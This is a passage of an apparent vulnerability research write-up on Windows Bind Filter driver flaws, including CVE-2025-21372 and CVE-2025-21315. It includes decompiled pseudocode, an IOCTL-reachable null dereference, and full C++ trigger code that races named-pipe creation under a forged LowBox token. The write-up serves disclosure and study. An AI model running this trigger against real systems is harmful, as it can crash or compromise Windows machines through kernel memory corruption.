+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> __fastcall BfsNamedPipeStreamHandleCleanup<span class="op">(</span>StreamHandleCTX <span class="op">*</span>StreamCtx<span class="op">,</span> FLT_CONTEXT_TYPE CtxType<span class="op">)</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Check Context Type (FLT_STREAMHANDLE_CONTEXT) and Unk Value</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> CtxType <span class="op">==</span> <span class="bn">0x10</span> <span class="op">&amp;&amp;</span> StreamCtx<span class="op">-&gt;</span>unkDWORD0 <span class="op">==</span> <span class="dv">1</span> <span class="op">)</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    BfsReleaseNamedPipeMapping<span class="op">(&amp;</span>gBfsPipeMappingTable<span class="op">,</span> StreamCtx<span class="op">-&gt;</span>PipeEntry<span class="op">);</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h3 id="recap">Recap</h3>
+<p>Finally for a pipe mapping to be created the following criteria needs to be met the calling process must be in an <code>AppSilo</code> and the pipe creation operation must succeed. For a pipe mapping to be released, the <code>BfsNamedPipeStreamHandleCleanup</code> needs to be called when a handle is gets closed. The Use After Free (UAF) can be triggered using 2 threads performing the same logic:</p>
+<ol type="1">
+<li>Thread impersonates an access token with <code>isAppSilo</code> set
+to 1</li>
+<li>Thread enters infinite loop
+<ol type="1">
+<li>Thread creates a named pipe using a simple name
+(<code>\\.\pipe\myPipe</code>)</li>
+<li>Thread closes handle to named pipe</li>
+</ol></li>
+</ol>
+<h3 id="trigger-development">Trigger Development</h3>
+<p>To create the correct token that passed the <code>isAppSilo</code> check, <a href="https://github.com/zodiacon/JobExplorer">Job Explorer v0.9</a> by Pavel Yosifovich was utilized to inspect all current job objects. The Microsoft widgets application (widgets.exe) was confirmed to be using an App Silo with the container name being <code>MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy</code>.</p>
+<p><img src="BFSJanImg/image-7.png" alt="alt text" /> <strong>Job Explorer Output Showing Widgets Container</strong></p>
+<p>A function <code>GenerateLowBoxToken</code> was then developed which does the following:</p>
+<ol type="1">
+<li>Resolve <code>AppContainerSid</code> for <code>Widgets</code>
+container using
+<code>DeriveAppContainerSidFromAppContainerName</code></li>
+<li>Create a <code>privateNetworkClientServer</code> capability
+(<code>S-1-15-3-65536</code>)</li>
+<li>Capture the current process token</li>
+<li>Use <code>NtCreateLowBoxToken</code> to generate a
+<code>LowBoxToken</code> based on the current process token with
+<code>privateNetworkClientServer</code> capability</li>
+<li>Return Token</li>
+</ol>
+<p>An additional function named <code>Trigger</code> was developed does the following:</p>
+<ol type="1">
+<li>Cast single input as a <code>HANDLE</code> and use
+<code>ImpersonateLoggedOnUser</code> to impersonate the token</li>
+<li>Enters infinite while loop</li>
+<li>Creates a named pipe with the name <code>\\.\pipe\myPipe</code></li>
+<li>Closes handle to named pipe</li>
+</ol>
+<p>The <code>main</code> function is responsible for: 1. Calling <code>GenerateLowBoxToken</code> to generate a LowBox token (<code>hToken</code>) 2. Creating 2 threads of the <code>Trigger</code> function and passing the token (<code>hToken</code>) as a parameter</p>
+<p>The full trigger code can be seen below:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">/// </span><span class="kw">&lt;summary&gt;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="co">/// </span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="co">/// CVE-2025-21372:</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co">/// BfsReleaseNamedPipeMapping incorrect locking logic</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="co">/// </span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="co">/// </span><span class="kw">&lt;/summary&gt;</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;Windows.h&gt;</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;userenv.h&gt;</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sddl.h&gt;</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;iostream&gt;</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;winternl.h&gt;</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a><span class="pp">#pragma comment(lib, &quot;userenv.lib&quot;)</span></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> NTSTATUS<span class="op">(</span>NTAPI<span class="op">*</span> PNtCreateLowBoxToken<span class="op">)(</span></span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>    PHANDLE TokenHandle<span class="op">,</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>    HANDLE ExistingTokenHandle<span class="op">,</span></span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>    ACCESS_MASK DesiredAccess<span class="op">,</span></span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>    POBJECT_ATTRIBUTES ObjectAttributes<span class="op">,</span></span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>    PSID PackageSid<span class="op">,</span></span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>    ULONG CapabilityCount<span class="op">,</span></span>
+<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>    PSID_AND_ATTRIBUTES Capabilities<span class="op">,</span></span>
+<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a>    ULONG HandleCount<span class="op">,</span></span>
+<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>    HANDLE<span class="op">*</span> Handles</span>
+<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>HANDLE GenerateLowBoxToken<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a>    HMODULE hNtdll <span class="op">=</span> GetModuleHandleW<span class="op">(</span><span class="st">L&quot;ntdll.dll&quot;</span><span class="op">);</span></span>
+<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>hNtdll<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Failed to get ntdll.dll handle</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a>    PNtCreateLowBoxToken pNtCreateLowBoxToken <span class="op">=</span> <span class="op">(</span>PNtCreateLowBoxToken<span class="op">)</span> GetProcAddress<span class="op">(</span>hNtdll<span class="op">,</span> <span class="st">&quot;NtCreateLowBoxToken&quot;</span><span class="op">);</span></span>
+<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1. Resolve App Container Sid for Widgets Container</span></span>
+<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a>    <span class="at">const</span> <span class="dt">wchar_t</span><span class="op">*</span> containerName <span class="op">=</span> <span class="st">L&quot;MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy&quot;</span><span class="op">;</span></span>
+<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a>    PSID appContainerSid <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a>    HRESULT hr <span class="op">=</span> DeriveAppContainerSidFromAppContainerName<span class="op">(</span>containerName<span class="op">,</span> <span class="op">&amp;</span>appContainerSid<span class="op">);</span></span>
+<span id="cb13-42"><a href="#cb13-42" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>FAILED<span class="op">(</span>hr<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb13-43"><a href="#cb13-43" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;DeriveAppContainerSid failed. HR(</span><span class="sc">%x</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> hr<span class="op">);</span></span>
+<span id="cb13-44"><a href="#cb13-44" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb13-45"><a href="#cb13-45" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-46"><a href="#cb13-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-47"><a href="#cb13-47" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 2. Create a privateNetworkClientServer capability (`S-1-15-3-65536`)</span></span>
+<span id="cb13-48"><a href="#cb13-48" aria-hidden="true" tabindex="-1"></a>    <span class="at">const</span> DWORD capCt <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb13-49"><a href="#cb13-49" aria-hidden="true" tabindex="-1"></a>    SID_AND_ATTRIBUTES caps<span class="op">[</span>capCt<span class="op">]</span> <span class="op">=</span> <span class="op">{};</span></span>
+<span id="cb13-50"><a href="#cb13-50" aria-hidden="true" tabindex="-1"></a>    PSID capSid <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb13-51"><a href="#cb13-51" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ConvertStringSidToSidW<span class="op">(</span><span class="st">L&quot;S-1-15-3-65536&quot;</span><span class="op">,</span> <span class="op">&amp;</span>capSid<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb13-52"><a href="#cb13-52" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;ConvertStringSidToSid failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-53"><a href="#cb13-53" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb13-54"><a href="#cb13-54" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-55"><a href="#cb13-55" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">0</span><span class="op">].</span>Sid <span class="op">=</span> capSid<span class="op">;</span></span>
+<span id="cb13-56"><a href="#cb13-56" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">0</span><span class="op">].</span>Attributes <span class="op">=</span> SE_GROUP_ENABLED<span class="op">;</span></span>
+<span id="cb13-57"><a href="#cb13-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-58"><a href="#cb13-58" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 3. Capture the current process token</span></span>
+<span id="cb13-59"><a href="#cb13-59" aria-hidden="true" tabindex="-1"></a>    HANDLE existingToken <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb13-60"><a href="#cb13-60" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>OpenProcessToken<span class="op">(</span>GetCurrentProcess<span class="op">(),</span> TOKEN_ALL_ACCESS<span class="op">,</span> <span class="op">&amp;</span>existingToken<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb13-61"><a href="#cb13-61" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;OpenProcessToken failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-62"><a href="#cb13-62" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb13-63"><a href="#cb13-63" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-64"><a href="#cb13-64" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-65"><a href="#cb13-65" aria-hidden="true" tabindex="-1"></a>    OBJECT_ATTRIBUTES oa <span class="op">=</span> <span class="op">{};</span></span>
+<span id="cb13-66"><a href="#cb13-66" aria-hidden="true" tabindex="-1"></a>    InitializeObjectAttributes<span class="op">(&amp;</span>oa<span class="op">,</span> <span class="kw">nullptr</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
+<span id="cb13-67"><a href="#cb13-67" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-68"><a href="#cb13-68" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 4. Use `NtCreateLowBoxToken` to generate a `LowBoxToken` based on the current process token with `privateNetworkClientServer` capability</span></span>
+<span id="cb13-69"><a href="#cb13-69" aria-hidden="true" tabindex="-1"></a>    HANDLE lowboxToken <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb13-70"><a href="#cb13-70" aria-hidden="true" tabindex="-1"></a>    NTSTATUS status <span class="op">=</span> pNtCreateLowBoxToken<span class="op">(</span></span>
+<span id="cb13-71"><a href="#cb13-71" aria-hidden="true" tabindex="-1"></a>        <span class="op">&amp;</span>lowboxToken<span class="op">,</span></span>
+<span id="cb13-72"><a href="#cb13-72" aria-hidden="true" tabindex="-1"></a>        existingToken<span class="op">,</span></span>
+<span id="cb13-73"><a href="#cb13-73" aria-hidden="true" tabindex="-1"></a>        TOKEN_ALL_ACCESS<span class="op">,</span></span>
+<span id="cb13-74"><a href="#cb13-74" aria-hidden="true" tabindex="-1"></a>        <span class="op">&amp;</span>oa<span class="op">,</span></span>
+<span id="cb13-75"><a href="#cb13-75" aria-hidden="true" tabindex="-1"></a>        appContainerSid<span class="op">,</span></span>
+<span id="cb13-76"><a href="#cb13-76" aria-hidden="true" tabindex="-1"></a>        capCt<span class="op">,</span> </span>
+<span id="cb13-77"><a href="#cb13-77" aria-hidden="true" tabindex="-1"></a>        caps<span class="op">,</span></span>
+<span id="cb13-78"><a href="#cb13-78" aria-hidden="true" tabindex="-1"></a>        <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb13-79"><a href="#cb13-79" aria-hidden="true" tabindex="-1"></a>        <span class="kw">nullptr</span></span>
+<span id="cb13-80"><a href="#cb13-80" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb13-81"><a href="#cb13-81" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>status <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-82"><a href="#cb13-82" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;NtCreateLowBoxToken failed: 0x</span><span class="sc">%X\n</span><span class="st">&quot;</span><span class="op">,</span> status<span class="op">);</span></span>
+<span id="cb13-83"><a href="#cb13-83" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb13-84"><a href="#cb13-84" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-85"><a href="#cb13-85" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-86"><a href="#cb13-86" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 5. Return Token </span></span>
+<span id="cb13-87"><a href="#cb13-87" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Successfully Created Lowbox Token</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-88"><a href="#cb13-88" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> lowboxToken<span class="op">;</span></span>
+<span id="cb13-89"><a href="#cb13-89" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb13-90"><a href="#cb13-90" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-91"><a href="#cb13-91" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-92"><a href="#cb13-92" aria-hidden="true" tabindex="-1"></a>VOID  Trigger<span class="op">(</span>LPVOID lpParam<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-93"><a href="#cb13-93" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-94"><a href="#cb13-94" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1. Cast input input as Token and Impersonate </span></span>
+<span id="cb13-95"><a href="#cb13-95" aria-hidden="true" tabindex="-1"></a>    HANDLE hToken <span class="op">=</span> <span class="op">(</span>HANDLE<span class="op">)</span>lpParam<span class="op">;</span></span>
+<span id="cb13-96"><a href="#cb13-96" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ImpersonateLoggedOnUser<span class="op">(</span>hToken<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb13-97"><a href="#cb13-97" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Could not impersonate in thread :( &quot;</span><span class="op">);</span></span>
+<span id="cb13-98"><a href="#cb13-98" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb13-99"><a href="#cb13-99" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-100"><a href="#cb13-100" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-101"><a href="#cb13-101" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 2. Enter infinite loop</span></span>
+<span id="cb13-102"><a href="#cb13-102" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-103"><a href="#cb13-103" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-104"><a href="#cb13-104" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 3. Open a handle to nameed pipe</span></span>
+<span id="cb13-105"><a href="#cb13-105" aria-hidden="true" tabindex="-1"></a>        HANDLE hPipe <span class="op">=</span> CreateNamedPipeW<span class="op">(</span></span>
+<span id="cb13-106"><a href="#cb13-106" aria-hidden="true" tabindex="-1"></a>            <span class="st">L&quot;</span><span class="sc">\\\\</span><span class="st">.</span><span class="sc">\\</span><span class="st">pipe</span><span class="sc">\\</span><span class="st">myPipe&quot;</span><span class="op">,</span>         </span>
+<span id="cb13-107"><a href="#cb13-107" aria-hidden="true" tabindex="-1"></a>            PIPE_ACCESS_DUPLEX<span class="op">,</span>                 </span>
+<span id="cb13-108"><a href="#cb13-108" aria-hidden="true" tabindex="-1"></a>            PIPE_TYPE_BYTE <span class="op">|</span> PIPE_READMODE_BYTE <span class="op">|</span> PIPE_WAIT<span class="op">,</span></span>
+<span id="cb13-109"><a href="#cb13-109" aria-hidden="true" tabindex="-1"></a>            <span class="dv">100</span><span class="op">,</span> <span class="dv">4096</span><span class="op">,</span> <span class="dv">4096</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb13-110"><a href="#cb13-110" aria-hidden="true" tabindex="-1"></a>            NULL                             </span>
+<span id="cb13-111"><a href="#cb13-111" aria-hidden="true" tabindex="-1"></a>        <span class="op">);</span></span>
+<span id="cb13-112"><a href="#cb13-112" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb13-113"><a href="#cb13-113" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 4. Close handle to pipe if successful</span></span>
+<span id="cb13-114"><a href="#cb13-114" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>hPipe <span class="op">!=</span> INVALID_HANDLE_VALUE<span class="op">)</span></span>
+<span id="cb13-115"><a href="#cb13-115" aria-hidden="true" tabindex="-1"></a>            CloseHandle<span class="op">(</span>hPipe<span class="op">);</span></span>
+<span id="cb13-116"><a href="#cb13-116" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span></span>
+<span id="cb13-117"><a href="#cb13-117" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb13-118"><a href="#cb13-118" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-119"><a href="#cb13-119" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Broke Got an INVALID_HANDLE_VALUE&quot;</span><span class="op">);</span></span>
+<span id="cb13-120"><a href="#cb13-120" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb13-121"><a href="#cb13-121" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-122"><a href="#cb13-122" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb13-123"><a href="#cb13-123" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1. Generate low box token</span></span>
+<span id="cb13-124"><a href="#cb13-124" aria-hidden="true" tabindex="-1"></a>    HANDLE hToken <span class="op">=</span> GenerateLowBoxToken<span class="op">();</span></span>
+<span id="cb13-125"><a href="#cb13-125" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>hToken <span class="op">!=</span> INVALID_HANDLE_VALUE<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-126"><a href="#cb13-126" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;[+] Successfully created LowBox Token&quot;</span><span class="op">);</span></span>
+<span id="cb13-127"><a href="#cb13-127" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 2. Create 2 threads of the Trigger function</span></span>
+<span id="cb13-128"><a href="#cb13-128" aria-hidden="true" tabindex="-1"></a>        HANDLE hThread1 <span class="op">=</span> CreateThread<span class="op">(</span><span class="kw">nullptr</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span>              </span>
+<span id="cb13-129"><a href="#cb13-129" aria-hidden="true" tabindex="-1"></a>          <span class="op">(</span>LPTHREAD_START_ROUTINE<span class="op">)</span>Trigger<span class="op">,</span></span>
+<span id="cb13-130"><a href="#cb13-130" aria-hidden="true" tabindex="-1"></a>           hToken<span class="op">,</span>        </span>
+<span id="cb13-131"><a href="#cb13-131" aria-hidden="true" tabindex="-1"></a>           <span class="dv">0</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
+<span id="cb13-132"><a href="#cb13-132" aria-hidden="true" tabindex="-1"></a>        HANDLE hThread2 <span class="op">=</span> CreateThread<span class="op">(</span><span class="kw">nullptr</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb13-133"><a href="#cb13-133" aria-hidden="true" tabindex="-1"></a>           <span class="op">(</span>LPTHREAD_START_ROUTINE<span class="op">)</span>Trigger<span class="op">,</span></span>
+<span id="cb13-134"><a href="#cb13-134" aria-hidden="true" tabindex="-1"></a>            hToken<span class="op">,</span></span>
+<span id="cb13-135"><a href="#cb13-135" aria-hidden="true" tabindex="-1"></a>            <span class="dv">0</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
+<span id="cb13-136"><a href="#cb13-136" aria-hidden="true" tabindex="-1"></a>            getchar<span class="op">();</span></span>
+<span id="cb13-137"><a href="#cb13-137" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-138"><a href="#cb13-138" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span> printf<span class="op">(</span><span class="st">&quot;[!] Unable to create low box token</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb13-139"><a href="#cb13-139" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb13-140"><a href="#cb13-140" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong>CVE-2025-21372 Trigger Code</strong></p>
+<h2 id="trying-to-trigger-cve-2025-21315">Trying to Trigger CVE-2025-21315</h2>
+<p>Originally, <code>CVE-2025-21315</code> seemed a bit easier to trigger due to the nature of the bug (certain code paths did not properly lock the <code>PolicyTable</code> object). With that said, a successful trigger was not developed in the time allocated to this project due to a variety of reasons with the biggest being the following:</p>
+<ul>
+<li>The <code>PolicyEntry</code> structure was a lot more complex and
+contained nested structures such as the <code>StorageObject</code>
+structure</li>
+<li>Additional vulnerabilities were discovered when attempting to
+trigger <code>CVE-2025-21315</code> including:
+<ul>
+<li>A null pointer derference when calling
+<code>DereferencePolicyEntry</code> on a <code>PolicyEntry</code>
+without a backing <code>StorageObject</code>
+<ul>
+<li>This condition can be created when a <code>Non existent</code>
+policy entry is created from Registery operation hooks</li>
+</ul></li>
+<li>An additional Use-After-Free bug (<code>CVE-2025-29970</code>) being
+discovered in the <code>DereferencePolicyEntry</code> logic</li>
+</ul></li>
+</ul>
+<h3
+id="bfsenumeratepolicy-null-pointer-derference-details"><code>BfsEnumeratePolicy</code> Null Pointer Derference Details</h3>
+<p>The <code>BfsProcessDeletePolicyEntryRequest</code> function, is callable from the <code>MAJOR_DEVICE_CONTROL</code> (<code>BfsDeviceIoControl</code>) function if an IO Control Code (<code>IOCTL</code>) of <code>0x228010</code> is suppolied to <code>DeviceIoControl</code> from usermode. The <code>BfsProcessDeletePolicyEntryRequest</code> function is responsible for deleting <code>PolicyEntry</code> objects from the <code>PolicyTable</code> object. The function pseduocode can be seen below:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsProcessDeletePolicyEntryRequest<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>TokenHandle<span class="op">)</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1. Get `ACCESS_TOKEN` object from User Supplied Token Value</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    v1 <span class="op">=</span> ObReferenceObjectByHandle<span class="op">(</span>TokenHandle<span class="op">,</span> <span class="dv">8</span><span class="bu">u</span><span class="op">,</span> SeTokenObjectType<span class="op">,</span> <span class="dv">1</span><span class="op">,</span> <span class="op">&amp;</span>Token<span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 2. Check if AppSilo Token</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>BfsIsApplicableToken<span class="op">(</span>Token<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ... </span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a></span>
